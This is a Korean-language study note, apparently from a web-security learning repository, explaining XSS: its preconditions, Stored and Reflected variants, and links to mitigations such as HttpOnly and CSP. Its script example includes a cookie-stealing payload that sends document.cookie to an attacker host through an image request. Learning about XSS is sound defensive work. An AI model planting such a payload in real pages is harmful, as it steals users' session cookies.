# XSS

공격자의 입력값이
자바스크립트의 일부로 웹 브라우저에서
실행되는 취약점을 말한다.

## 목차
1. [xss를 성공하기 위해서](#xss를-성공하기-위해서)
2. [XSS with JavaScript](#XSS-with-Javascript)
3. [Stored XSS](#stored-xss)
4. [Reflected XSS](#reflected-xss)
5. [해결방안](#해결방안)

## xss를 성공하기 위해서

XSS공격을 성공하기 위해서는
통상적으로 두가지의 조건이 전제되어야 한다.

    1. 입력 데이터에 대한 충분한 검증 과정이 없어야 한다.
        - 입력한 데이터가 충분한 검증 과정이 없어,
          악성스크립트가 삽입 될 수 있어야 한다.
    
    2. 서버의 응답 데이터가 웹 브라우저 내 페이지에
       출력 시 충분한 검증 과정이 없어야 한다.
       - 웹 브라우저에서 출력 시 필터링에 걸리지 않아야한다.

이들의 대표적인 예시로는 게시판 서비스이며,
이는 게시글이 검증되지 않을 경우 해당 게시글의 이용자들이
악성스크립트가 그대로 실행되기 때문에 위험하다.
```txt
+ 악성스크립트가 전달되는 방식에 따라
  Stored XSS
  Reflected XSS
  등 여러가지로 나뉜다.
  
  하지만 취약점의 원인은 동일하다.
```

## XSS with Javascript

JS는 사용자의 웹 브라우저에서 동적으로 보여주거나,
화면 구성을 변환하거나, 자동으로 버튼을 누르는 등의
작업을 할 때 많이 사용된다.

이런 JS는 웹 브라우저나 웹의 입장에서 상당히 접근성이 높기에
페이지 내용 조작, 위치 주소 변경, 개인정보 유출 등 다양한 방식으로
동작 시킬 수 있기때문에 이는 XSS에 다양하게 이용된다.

이를 작동시키는 대표적인 방법은
```html
    <script>
        alert("hello");
        //hello 문자열 alert 실행

        document.cookie; 
        //현재 페이지의 cookie 리턴

        alert(document.cookie);
        //현재 페이지의 cookie값 alert 실행

        document.cookie = "name=test;";
        //도큐먼트의 쿠키 생성, (key: name, value: test)

                
        new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
        // new Image() 는 이미지를 생성하는 함수이며,
        // src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
        // "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키"
        //주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
    </script>
```
이 처럼 script태그를 이용하는 방식이 있으며,
특정상황을 이용하는 on* 이벤트들을 이용하는 경우도 있다.

## Stored XSS

이는 악성 스크립트가 서버 내에 저장되어있다가,
사용자가 이 스크립트를 조회하는 순간
발생하는 형태의 XSS이다.

이는 게시판과 같은 형태에서는
불특정 다수에게 공격이 가능하다는 점에서
높은 파급력이 생길 가능성이 존재한다.

## Reflected XSS

이는 악성스크립트가 사용자의 요청 시
전송되는 형태이다.

사용자의 요청 데이터가 서버의 응답에
포함되는 과정에서 악성스크립트가
그대로 출력되어 발생하게 된다.

이는 Stored XSS와는 다르게 사용자의 요청 데이터에
의해 취약점이 발생하기 때문에,
변조된 데이터가 사용자의 요청으로
전송되는 형태를 유도하여야 한다.

가장 간단한 방법은 특정 링크를 유도하는 방식이 있으며,
Click Jacking, Open Redirect등의
취약점과 연계할 수 있다.

대표적인 예로는 게시물들을 조회하기 위해
입력한 데이터에 의한 방식이 있다.
해당요청에 의하여 조회 한 결과를 응답에 출력하는데,
이때 서버가 제대로 방어를 하지않으면
Reflected XSS로 이어질 수 있다.

## 해결방안

  1. [Server-side Mitigations](./Server-side.md)
  2. [HTTPOnly 플래그 사용](./HTPPOnly.md)
  3. [Content Security Policy 사용](./CSP.md)
  4. [X-XSS-Protection](./X-XSS-Protection.md)

**[Home](https://github.com/sunrabbit123/Learn_Web_Security)**